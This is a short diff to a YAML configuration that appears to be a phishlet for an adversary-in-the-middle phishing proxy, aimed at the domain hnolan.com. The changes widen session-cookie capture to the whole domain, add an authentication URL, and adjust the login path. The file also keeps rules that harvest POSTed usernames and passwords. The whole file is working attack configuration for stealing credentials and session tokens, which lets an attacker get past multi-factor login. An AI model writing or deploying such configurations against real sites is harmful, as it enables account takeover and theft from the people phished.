@@ -1,9 +1,12 @@
 min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: 'demo', orig_sub: 'demo', domain: 'hnolan.com', session: true, is_landing: true, auto_filter: true}
+auth_urls:
+  - '/login'
 auth_tokens:
-  - domain: '.demo.hnolan.com'
+  - domain: '.hnolan.com'
     keys: ['session']
+    type: 'cookie'
 credentials:
   username:
     key: 'username'
@@ -15,4 +18,4 @@ credentials:
     type: 'post'
 login:
   domain: 'demo.hnolan.com'
-  path: '/login'
+  path: '/'
